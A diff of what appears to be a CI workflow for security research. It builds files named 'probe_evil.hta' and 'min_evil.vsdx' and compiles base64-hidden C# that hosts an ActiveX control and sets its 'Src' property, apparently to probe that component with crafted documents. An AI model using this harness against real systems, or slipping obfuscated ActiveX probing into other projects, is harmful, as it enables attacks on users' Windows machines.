@@ -82,7 +82,7 @@ jobs:
         MkHta "$PWD\probe_evil.hta" "$PWD\min_evil.vsdx"
         "hta built"
     - name: Precompile host assembly
-      shell: pwsh
+      shell: powershell
       run: |
         $cs = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsKcHVibGljIGNsYXNzIFZ2V2YyIDogQXhIb3N0IHsKICBwdWJsaWMgVnZXZjIoKSA6IGJhc2UoIntGOENGN0E5OC0yQzQ1LTRjOGQtOTE1MS0yRDcxNjk4OUREQUJ9Iikge30KICBwdWJsaWMgc3RyaW5nIERvU3JjKHN0cmluZyBwKSB7CiAgICB0cnkgewogICAgICBvYmplY3QgbyA9IHRoaXMuR2V0T2N4KCk7CiAgICAgIG8uR2V0VHlwZSgpLkludm9rZU1lbWJlcigiU3JjIiwgU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzLlNldFByb3BlcnR5LCBudWxsLCBvLCBuZXcgb2JqZWN0W117cH0pOwogICAgICByZXR1cm4gIlNSQ19PSyI7CiAgICB9IGNhdGNoIChFeGNlcHRpb24gZXgpIHsgcmV0dXJuICJTUkNfRVJSOiIgKyBleC5NZXNzYWdlOyB9CiAgfQogIHB1YmxpYyBzdHJpbmcgR2V0UChzdHJpbmcgbmFtZSkgewogICAgdHJ5IHsKICAgICAgb2JqZWN0IG8gPSB0aGlzLkdldE9jeCgpOwogICAgICByZXR1cm4gIiIgKyBvLkdldFR5cGUoKS5JbnZva2VNZW1iZXIobmFtZSwgU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzLkdldFByb3BlcnR5LCBudWxsLCBvLCBudWxsKTsKICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCkgeyByZXR1cm4gIlBfRVJSOiIgKyBleC5NZXNzYWdlOyB9CiAgfQp9Cg=='))
         Add-Type -TypeDefinition $cs -ReferencedAssemblies System.Windows.Forms,System -OutputAssembly "$PWD\VvWf.dll" -OutputType Library
